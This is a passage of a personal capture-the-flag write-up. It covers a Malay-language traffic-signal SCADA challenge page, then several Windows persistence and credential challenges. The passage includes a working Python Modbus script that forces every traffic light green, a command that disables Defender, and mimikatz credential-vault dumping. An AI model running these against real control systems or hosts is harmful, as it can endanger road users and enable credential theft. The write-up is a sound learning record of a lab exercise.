#404040; padding: 4px 24px; font-size: 11px; font-family: Arial, sans-serif; cursor: pointer; } /* Status bar at bottom */ .statusbar { background: #d4d0c8; border-top: 2px solid #ffffff; height: 22px; display: flex; align-items: center; gap: 0; font-size: 10px; font-family: Arial, sans-serif; flex-shrink: 0; overflow: hidden; } .sb-section { padding: 0 8px; border-right: 2px solid #808080; height: 100%; display: flex; align-items: center; color: #000080; white-space: nowrap; } .sb-main { flex: 1; overflow: hidden; } .sb-inner { display: inline-block; animation: marquee 35s linear infinite; padding-left: 100%; white-space: nowrap; } </style> </head> <body> <div class="marquee-bar"> <span class="marquee-inner"> *** SISTEM KAWALAN TRAFIK BERSEPADU *** DILARANG MASUK TANPA KEBENARAN *** HARTA KERAJAAN MALAYSIA *** UNAUTHORIZED ACCESS IS STRICTLY PROHIBITED *** AKSES TANPA KEBENARAN ADALAH DILARANG *** SISTEM KAWALAN TRAFIK BERSEPADU *** DILARANG MASUK TANPA KEBENARAN *** HARTA KERAJAAN MALAYSIA *** </span> </div> <div class="header"> <div class="header-title"> <div class="main">SISTEM KAWALAN TRAFIK BERSEPADU (SKTB)</div> <div class="sub">JABATAN PENGURUSAN INFRASTRUKTUR &nbsp;|&nbsp; UNIT KAWALAN PUSAT &nbsp;|&nbsp; PAPARAN SKADA </div> </div> <div class="header-right"> <div id="clock" style="font-size:14px; font-weight:bold;">--:--:--</div> <div style="font-size:9px; margin-top:2px;">MASA SISTEM</div> <div style="margin-top:4px; font-size:9px;"><span class="status-dot"></span> SISTEM AKTIF</div> </div> </div> <div class="navbar"> <a href="/">DAFTAR MASUK</a> <a href="/scada.html" class="active">KAWALAN ISYARAT</a> <div class="navbar-right"> <span>MODBUS/TCP: <b style="color:#cc0000">502</b></span> <span>SUAPAN DATA: <b style="color:#cc0000">4444</b></span> <span>ID UNIT: <b style="color:#cc0000">0xFF</b></span> </div> </div> <div class="layout"> <!-- Sidebar --> <div class="sidebar"> <div class="sidebar-panel"> <div class="sidebar-panel-title">DAFTAR GEGELUNG — FC01</div> <div class="sidebar-panel-body" id="coilRows"></div> </div> <div class="sidebar-panel"> <div class="sidebar-panel-title">MAKLUMAT PERANTI</div> <div class="sidebar-panel-body"> <div class="info-block"> <span class="lbl">PROTOKOL : </span><span class="val">MODBUS/TCP</span><br> <span class="lbl">ALAMAT &nbsp; : </span><span class="val">0.0.0.0</span><br> <span class="lbl">PORT &nbsp;&nbsp;&nbsp; : </span><span class="val">502</span><br> <span class="lbl">UNIT ID &nbsp; : </span><span class="val">0xFF</span><br> <span class="lbl">FC TULIS &nbsp; : </span><span class="val">FC05</span><br> <span class="lbl">FC BACA &nbsp; : </span><span class="val">FC01</span><br> <br> <span class="lbl">SUAPAN DATA</span><br> <span class="lbl">PORT &nbsp;&nbsp;&nbsp; : </span><span class="val">4444</span><br> <span class="lbl">PROTOKOL : </span><span class="val">TCP RAW</span> </div> </div> </div> <div class="sidebar-panel"> <div class="sidebar-panel-title">STATUS SISTEM</div> <div class="sidebar-panel-body"> <div class="status-text" id="winStatus">MENUNGGU INPUT...</div> </div> </div> </div> <!-- Main --> <div class="canvas"> <div class="scene" id="scene"> <div class="tl-group" id="tl-group-0"> <div class="tl-id">IS-1</div> <div class="tl-housing"> <div class="bulb red on" id="tl0-red"></div> <div class="bulb yel" id="tl0-yel"></div> <div class="bulb grn" id="tl0-grn"></div> </div> <div class="tl-pole"></div> <div class="tl-base"></div> </div> <div class="tl-group" id="tl-group-1"> <div class="tl-id">IS-2</div> <div class="tl-housing"> <div class="bulb red on" id="tl1-red"></div> <div class="bulb yel" id="tl1-yel"></div> <div class="bulb grn" id="tl1-grn"></div> </div> <div class="tl-pole"></div> <div class="tl-base"></div> </div> <div class="tl-group" id="tl-group-2"> <div class="tl-id">IS-3</div> <div class="tl-housing"> <div class="bulb red on" id="tl2-red"></div> <div class="bulb yel" id="tl2-yel"></div> <div class="bulb grn" id="tl2-grn"></div> </div> <div class="tl-pole"></div> <div class="tl-base"></div> </div> <div class="road"> <div class="road-line"></div> <div class="road-shoulder"></div> </div> <div class="car" id="car"> <svg viewBox="0 0 90 44" fill="none" xmlns="http://www.w3.org/2000/svg"> <rect x="5" y="18" width="80" height="20" rx="2" fill="#cc2222" /> <rect x="18" y="9" width="48" height="12" rx="2" fill="#aa1111" /> <rect x="20" y="10" width="19" height="9" rx="1" fill="#88ccff" opacity="0.85" /> <rect x="45" y="10" width="18" height="9" rx="1" fill="#88ccff" opacity="0.75" /> <rect x="81" y="20" width="6" height="5" rx="1" fill="#ffffaa" /> <rect x="81" y="28" width="6" height="4" rx="1" fill="#ffddaa" opacity="0.8" /> <rect x="3" y="20" width="4" height="4" rx="1" fill="#ff4444" /> <rect x="3" y="28" width="4" height="4" rx="1" fill="#ff4444" opacity="0.7" /> <circle cx="22" cy="38" r="6" fill="#222" stroke="#555" stroke-width="2" /> <circle cx="22" cy="38" r="2" fill="#555" /> <circle cx="68" cy="38" r="6" fill="#222" stroke="#555" stroke-width="2" /> <circle cx="68" cy="38" r="2" fill="#555" /> <line x1="40" y1="18" x2="40" y2="37" stroke="#881111" stroke-width="1" /> </svg> </div> </div> <div class="info-bar"> <div class="info-item">KADAR IMBAS <span id="scanRate">2000ms</span></div> <div class="info-item">IS-1 <span id="tl1state">MERAH</span></div> <div class="info-item">IS-2 <span id="tl2state">MERAH</span></div> <div class="info-item">IS-3 <span id="tl3state">MERAH</span></div> <div class="info-item">GEGELUNG AKTIF <span id="coilsActive">3/9</span></div> </div> <div class="coil-table-wrap"> <div class="table-title">PETA GEGELUNG OUTPUT DISKRET — ALAMAT 0x0000 HINGGA 0x0008</div> <table class="coil-table"> <thead> <tr> <th>ALAMAT</th> <th>TAG</th> <th>PERANTI</th> <th>NILAI</th> </tr> </thead> <tbody id="coilTableBody"></tbody> </table> </div> </div> </div> <!-- Win dialog - Windows 98 style --> <div class="win-overlay" id="winOverlay"> <div class="win-box"> <div class="win-titlebar"> <span>&#9888; SISTEM KAWALAN TRAFIK — MAKLUMAN</span> <div class="close-btn">✕</div> </div> <div class="win-body"> <div class="win-icon">🚦</div> <div class="win-msg">SEMUA ISYARAT HIJAU — LALUAN DIBUKA<br> <span style="font-size:10px; font-weight:normal; color:#333">Cabaran 2 Selesai // Challenge 2 Complete</span> </div> <div class="win-flag" id="flag2Value">---</div> <button class="win-ok-btn" onclick="document.getElementById('winOverlay').classList.remove('show')">OK</button> </div> </div> </div> <div class="statusbar"> <div class="sb-section"><span class="status-dot"></span>&nbsp;MODBUS:502 AKTIF</div> <div class="sb-section">SUAPAN:4444</div> <div class="sb-section" id="sbclock">--:--:--</div> <div class="sb-main"> <span class="sb-inner"> FC01 BACA GEGELUNG — ALAMAT 0x0000 BILANGAN 0x0009 &nbsp;|&nbsp; FC05 TULIS GEGELUNG TUNGGAL — ALAMAT + 0xFF00/0x0000 &nbsp;|&nbsp; SUAPAN MONITOR: TCP:4444 — BINGKAI MODBUS MENTAH &nbsp;|&nbsp; GEGELUNG 0x0002 = IS-1 HIJAU &nbsp; GEGELUNG 0x0005 = IS-2 HIJAU &nbsp; GEGELUNG 0x0008 = IS-3 HIJAU &nbsp;|&nbsp; FC01 BACA GEGELUNG — ALAMAT 0x0000 BILANGAN 0x0009 &nbsp;|&nbsp; FC05 TULIS GEGELUNG TUNGGAL — ALAMAT + 0xFF00/0x0000 &nbsp;|&nbsp; SUAPAN MONITOR: TCP:4444 — BINGKAI MODBUS MENTAH &nbsp;|&nbsp; </span> </div> </div> <script> const COIL_DEFS = [ { addr: '0x0000', tag: 'IS1_MERAH', device: 'ISYARAT 1' }, { addr: '0x0001', tag: 'IS1_KUNING', device: 'ISYARAT 1' }, { addr: '0x0002', tag: 'IS1_HIJAU', device: 'ISYARAT 1' }, { addr: '0x0003', tag: 'IS2_MERAH', device: 'ISYARAT 2' }, { addr: '0x0004', tag: 'IS2_KUNING', device: 'ISYARAT 2' }, { addr: '0x0005', tag: 'IS2_HIJAU', device: 'ISYARAT 2' }, { addr: '0x0006', tag: 'IS3_MERAH', device: 'ISYARAT 3' }, { addr: '0x0007', tag: 'IS3_KUNING', device: 'ISYARAT 3' }, { addr: '0x0008', tag: 'IS3_HIJAU', device: 'ISYARAT 3' }, ]; const STATE_LABEL = { red: 'MERAH', yel: 'KUNING', grn: 'HIJAU', off: 'MATI' }; let won = false; let carDriving = false; function buildCoilRows() { const wrap = document.getElementById('coilRows'); for (let i = 0; i < 9; i++) { const row = document.createElement('div'); row.className = 'coil-row'; row.innerHTML = `<span class="coil-label">${COIL_DEFS[i].addr}</span> <span class="coil-val off" id="sbar-coil-${i}">0</span>`; wrap.appendChild(row); } } function buildCoilTable() { const tbody = document.getElementById('coilTableBody'); for (let i = 0; i < 9; i++) { const tr = document.createElement('tr'); tr.innerHTML = `<td>${COIL_DEFS[i].addr}</td> <td>${COIL_DEFS[i].tag}</td> <td>${COIL_DEFS[i].device}</td> <td id="ctable-coil-${i}" class="val-off">0</td>`; tbody.appendChild(tr); } } function tlState(snap, tl) { const b = tl * 3; if (snap[b + 2]) return 'HIJAU'; if (snap[b + 1]) return 'KUNING'; if (snap[b]) return 'MERAH'; return 'MATI'; } function updateUI(data) { const coils = data.coils; for (let i = 0; i < 3; i++) { const b = i * 3; document.getElementById(`tl${i}-red`).className = 'bulb red' + (coils[b] ? ' on' : ''); document.getElementById(`tl${i}-yel`).className = 'bulb yel' + (coils[b + 1] ? ' on' : ''); document.getElementById(`tl${i}-grn`).className = 'bulb grn' + (coils[b + 2] ? ' on' : ''); } for (let i = 0; i < 9; i++) { const el = document.getElementById(`sbar-coil-${i}`); el.textContent = coils[i] ? '1' : '0'; el.className = coils[i] ? 'coil-val on' : 'coil-val off'; } for (let i = 0; i < 9; i++) { const el = document.getElementById(`ctable-coil-${i}`); const tag = COIL_DEFS[i].tag; if (coils[i]) { if (tag.endsWith('MERAH')) el.className = 'val-red'; else if (tag.endsWith('KUNING')) el.className = 'val-yel'; else el.className = 'val-on'; el.textContent = '1'; } else { el.className = 'val-off'; el.textContent = '0'; } } document.getElementById('tl1state').textContent = tlState(coils, 0); document.getElementById('tl2state').textContent = tlState(coils, 1); document.getElementById('tl3state').textContent = tlState(coils, 2); document.getElementById('coilsActive').textContent = `${coils.filter(Boolean).length}/9`; if (data.win && !won) { won = true; document.getElementById('winStatus').innerHTML = '<span style="color:#006600;font-weight:bold">SEMUA HIJAU — LALUAN DIBUKA</span>'; triggerCar(data.flag); } } function triggerCar(flag) { if (carDriving) return; carDriving = true; document.getElementById('car').classList.add('driving'); setTimeout(() => { document.getElementById('flag2Value').textContent = flag; document.getElementById('winOverlay').classList.add('show'); }, 3800); } async function poll() { try { const res = await fetch('/api/coils'); const data = await res.json(); updateUI(data); } catch (e) { } } function updateClock() { const t = new Date().toTimeString().slice(0, 8); document.getElementById('clock').textContent = t; document.getElementById('sbclock').textContent = t; } buildCoilRows(); buildCoilTable(); setInterval(updateClock, 1000); updateClock(); setInterval(poll, 2000); poll(); </script> </body> </html>⏎
```

- I noticed the `COIL_DEFS` const in the `<script>` sect. 

```html
<script>
    const COIL_DEFS = [
      { addr: '0x0000', tag: 'IS1_MERAH', device: 'ISYARAT 1' },
      { addr: '0x0001', tag: 'IS1_KUNING', device: 'ISYARAT 1' },
      { addr: '0x0002', tag: 'IS1_HIJAU', device: 'ISYARAT 1' },
      { addr: '0x0003', tag: 'IS2_MERAH', device: 'ISYARAT 2' },
      { addr: '0x0004', tag: 'IS2_KUNING', device: 'ISYARAT 2' },
      { addr: '0x0005', tag: 'IS2_HIJAU', device: 'ISYARAT 2' },
      { addr: '0x0006', tag: 'IS3_MERAH', device: 'ISYARAT 3' },
      { addr: '0x0007', tag: 'IS3_KUNING', device: 'ISYARAT 3' },
      { addr: '0x0008', tag: 'IS3_HIJAU', device: 'ISYARAT 3' },
    ];
```

- It also reveals the traffic light control UI polling `/api/coils` via Modbus TCP on port 502

```javascript
async function poll() {
      try {
        const res = await fetch('/api/coils');
        const data = await res.json();
        updateUI(data);
      } catch (e) { }
    }
```

10. Checked out `/api/coils`
![](Pasted%20image%2020260709222729.png)
On `Note` says: "Retrieve your flag via Modbus FC03 on your own connection."

11. By making a script that sends modbus FC05 (to write coils) and FC03 (to read the flag):

```python
import socket, struct

def fc05(trans_id, coil_addr, on):
    value = 0xFF00 if on else 0x0000
    mbap = struct.pack('>HHH', trans_id, 0x0000, 6)
    pdu  = struct.pack('>BBHH', 0xFF, 0x05, coil_addr, value)
    return mbap + pdu

def fc03(trans_id, start_addr, count):
    mbap = struct.pack('>HHH', trans_id, 0x0000, 6)
    pdu  = struct.pack('>BBHH', 0xFF, 0x03, start_addr, count)
    return mbap + pdu

s = socket.socket()
s.settimeout(10)
s.connect(('56.69.47.15', 502))

trans = 1

# turn all green lights ON
for addr in [0x0002, 0x0005, 0x0008]:
    s.send(fc05(trans, addr, True))
    print(f"FC05 green {hex(addr)}: {s.recv(12).hex()}")
    trans += 1

# turn all red lights OFF
for addr in [0x0000, 0x0003, 0x0006]:
    s.send(fc05(trans, addr, False))
    print(f"FC05 red off {hex(addr)}: {s.recv(12).hex()}")
    trans += 1

# read holding registers for flag on same conn.
for start in [0x0000, 0x0010, 0x0064, 0x0100]:
    s.send(fc03(trans, start, 32))
    resp = s.recv(256)
    print(f"FC03 reg@{hex(start)}: {resp[9:].decode('latin-1')}")
    trans += 1

s.close()
```

12. We have finally found the flag :] 
    
![](Pasted%20image%2020260709223127.png)

   >>  🚩 Flag Found: OWASPKL{ece7f522fa51100848b9da5952bbcef3}
# OS

## Windows

**Description**
This series centers on a single Windows VM. Your objective is to locate flags hidden throughout the machine, planted using techniques commonly used by threat actors for persistence and credential storage. 

The theme is **Operating systems & persistence techniques**. 

Threat actors frequently embed persistence mechanisms in predictable but overlooked locations — your job is to find them. 

**General Tip:** It's recommended that you investigate the live system rather than mounting and recursively searching the disk image — some flags depend on runtime state. 

**Credentials:** OS-CTF PIN: 220526 
**CTFUser Password:** CTFLocalP@ss123!

**Rules of Engagement**
- Do not change the CTFUser or any other password. This isn't just bad practice — on this VM, it will actively destroy the flag tied to that credential. Changing it is the in-game equivalent of bad OPSEC: it tips off your "target" and burns your access. Treat it as out of scope. 
- Do not power off the VM, including force shutdowns. Think of it like pulling the plug on a real victim machine mid-engagement — ungraceful shutdowns can corrupt running services and will remove flags tied to active state. 
- If you accidentally force-power-off the VM, revert to the original snapshot/image rather than continuing — some flags rely on services that won't recover cleanly otherwise.

Link 1: [https://drive.google.com/drive/folders/1cDi0SkUFxGmHQ-waIq9Y0esNa50QuWDj?usp=sharing](https://drive.google.com/drive/folders/1cDi0SkUFxGmHQ-waIq9Y0esNa50QuWDj?usp=sharing "https://drive.google.com/drive/folders/1cDi0SkUFxGmHQ-waIq9Y0esNa50QuWDj?usp=sharing") 
Link 2: [https://drive.google.com/drive/folders/1lgu5WGo1e-ec8XdJrN8NNcK1pTvjmoRs?usp=sharing](https://drive.google.com/drive/folders/1lgu5WGo1e-ec8XdJrN8NNcK1pTvjmoRs?usp=sharing "https://drive.google.com/drive/folders/1lgu5WGo1e-ec8XdJrN8NNcK1pTvjmoRs?usp=sharing")

### Local

**Description:**
Storing credentials in your OS's native credential store instead of a dedicated password manager has consequences. Finding this flag will show you why.

1. Booted up QEMU KVM. Saw 3 accounts. I logged into CTF User with the given password, `CTFLocalP@ss123!` 
   ![](Pasted%20image%2020260705000154.png)
   
2. Disabled windows defender on administrative powershell first, with running the command:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

3. I downloaded [mimikatz](https://github.com/gentilkiwi/mimikatz) for DPAPI dumping, a pretty useful tool to play with Windows Security.
   Then I enumerated vaults with `vault:list` and then dumped the creds with `vault:cred` 
   ![](Pasted%20image%2020260705000852.png)
   
   >> 🚩 Flag Found: OWASPKL{530cfdf60e73770f2d29a707870bf141}

### History

**Description:**
Always clean your types.

1. Since the chall name is literally named "History", and refers to cleaning MY "types", I can tell that its referring to Powershell's PSReadLine history file.

2. Went to `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` and found a Base64 string alongside [mojibaked](https://en.wikipedia.org/wiki/Mojibake) text. 
   ![](Pasted%20image%2020260705002344.png)

3. Decoded it and found a reversed string with the OWASPKL flag
   
   ![](Pasted%20image%2020260705002421.png)
   
3. Reversed the string 
   ![](Pasted%20image%2020260705002456.png)
   
   >>  🚩 Flag Found: OWASPKL{c85afb6ac751e0aaf1678947a172c935}

### Run

**Description:**
Did you solved Register and checked all registries?

1. Run... whats something that can run... ah yes, an `.exe` file. Where do we find them? It could be @:
	- `HKLM\` / `HKCU\`
		1. `SOFTWARE\Microsoft\Windows\Current\Version\Run`
		2. `SOFTWARE\Microsoft\Windows\Current\Version\RunOnce`

2. Opened up Registry Editor, and went to `HKLM\SOFTWARE\Microsoft\Windows\Current\Version\Run` and found an odd registry file, named `SvcHelper`, which is also called `svchelper.exe`.
   
   ![665](Pasted%20image%2020260705003253.png)

2. With using [Autoruns.exe](https://www.autoruns.org/), we get to see that SvcHelper is **Not Verified** as a Microsoft Windows publisher, so it's solid proof that ts is sus and could be malware. 
   ![](Pasted%20image%2020260705014035.png)
   
3. Checked the file to see if its a `.txt` file larping as an `.exe` file with 

```powershell
Get-Content "C:\Windows\System32\svchelper.exe"   
```

![](Pasted%20image%2020260705004418.png)

>> 🚩 Flag Found: OWASPKL{964b51ea1e502c770564c66f9fc9f996}

### Pipe

IPC but not a shopping Center

1. Challenge title mentioned about "pipe", so its most likely the pipe enmuration of `\\.\pipe\`.sh
   
   *Get it? pipes.sh from linux ricing? Hahahhahhahaahaaaaaaaaa im going crazy*

2. Listed all available pipes, by running

```powershell
[IO.Directory]::GetFiles("\\.\pipe\") | Where-Object {$_ -notmatch "lsass|ntsvcs|srvsvc|wkssvc|netlogon|samr|eventlog|spoolss|browser|atsvc|epmapper|trkwks|ProfMapApi|ROUTER|winreg"}
```

![](Pasted%20image%2020260705010806.png)

3. After carefully checking, `\\.\pipe\WinUpdateSvc` seems sus, coz its not a real windows pipe.

4. Before I continue using Powershell, I HAD to remove all of the history logs with 

```powershell
Remove-Module PSReadLine
```
as it was soo laggy coz its buttcheeks was too big to begin with... ;-;

*Basically, what I meant was when Powershell logs alot of output, especially when you're going through alot of files and registry logs, it becomes slower over time, especially on a VM that runs on 2GB of memory. I did increase it to 8GB but it didnt help, because the environment state is locked to 2GB.*

4. I read thru it, with:

```powershell
try { $p.Connect(2000); $r = New-Object System.IO.StreamReader($p); $r.ReadToEnd() } catch { $_ } finally { $p.Dispose() }
```

![](Pasted%20image%2020260705011121.png)
Found a Base64 string.

5. After decoding it, seems that we've found another reversed flag string
   
   ![](Pasted%20image%2020260705011532.png)

5. Reversing the string... 
   ![](Pasted%20image%2020260709210011.png)

>> 🚩 Flag Found: OWASPKL{2012cb63445eda6c68a79f17e6fc9c46}

### Fire

**Description:**
Ntdll.dll and kernel32.dll are commonly used files. What about the uncommon ones?

1. Since the challenge talks about *authentic* `.dll`'s, i check which ones are authentic first with

```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
```

![](Pasted%20image%2020260705011925.png)

2. When I checked scheduled tasks outside microsoft by running 

```powershell
Get-ScheduledTask | Where-Object { $_.TaskPatch -notmatch "\\Microsoft\\"} Select-Object TaskName, TaskPath | Format-List
```

found an odd task named SysCheckTask on the 2nd screenshot 

![](Pasted%20image%2020260705012114.png)![](Pasted%20image%2020260705012126.png)

3. Then I immediately checked that
```powershell
$t = Get-ScheduledTask -TaskName "SysCheckTask"
$t | Export-ScheduledTask
```

![](Pasted%20image%2020260705012410.png)

**2026-06-17**. hmm, we have a *date trail*, and its **super recent**.

![](Pasted%20image%2020260705012617.png)
	Checking for more info about the task... we see an execute action to `C:\Windows\System32\sysdiag.exe`, thats odd, and funni.
	
4. This basically confirms that `SysCheckTask` is 100% planted by `os-ct` user on 2026-06-17. IT runs `sysdiag.exe` at boot, which isn't even a real windows binary. Naughty naughty

5. Im going to check for any other sussy DLLs on the date close to it. 
   
   ![](Pasted%20image%2020260705012906.png) 
   Uh oh, bro got busted 💀

6. Read it as plaintext with

```powershell
Get-Content "C:\Windows\System32\winhelper32.dll"
```

![](Pasted%20image%2020260705013158.png)

7. Text too garbled, so I filtered in ASCII encoded only.

```powershell
$b = [IO.File]::ReadAllBytes("C:\Windows\System32\winhelper32.dll")
$s = [Text.Encoding]::ASCII.GetString($b)
[regex]::Match($s, 'OWASPKL\{[a-zA-Z0-9_]+\}').value
```

![](Pasted%20image%2020260705013252.png)

>> 🚩 Flag Found: OWASPKL{26f184e8dea97aa93f56726455c815d6}

# Final Thoughts

![](Pasted%20image%2020260709191301.png)

![](Pasted%20image%2020260709191314.png)

This has gotta be my highest placement yet fr B)

gotta love LabyREnth, *get it?*

